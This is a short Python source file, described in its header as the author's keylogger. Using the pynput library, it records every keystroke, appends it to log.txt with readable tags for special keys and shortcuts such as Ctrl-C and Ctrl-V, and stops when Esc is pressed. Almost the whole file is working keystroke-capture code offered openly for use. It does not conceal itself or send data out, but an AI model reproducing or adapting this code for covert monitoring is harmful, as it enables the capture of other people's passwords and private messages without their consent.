# This is my keylogger program that stores information entered from the keyboard.
# After 'run', the program starts memorizing information. When you press the esc key, the program will stop.


from pynput.keyboard import Key, Listener

count = 0
keys = []


def on_press(key):
    global keys, count

    keys.append(key)
    count += 1
    print(f'{key} pressed')

    if count == 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open('log.txt', 'a') as file:
        for key in keys:
            substitution = ['Key.enter', '[ENTER]\n', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
                            'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
                            'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]', '\\x13',
                            '[CTRL-S]', '\\x17', '[CTRL-W]', 'Key.caps_lock', '[CAPS LK]', '\\x01', '[CTRL-A]',
                            'Key.cmd',
                            '[WINDOWS KEY]', 'Key.print_screen', '[PRNT SCR]', '\\x03', '[CTRL-C]', '\\x16', '[CTRL-V]']

            key = str(key).strip('\'')
            if key in substitution:
                key = substitution[substitution.index(key)+1]

            file.write(key)


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
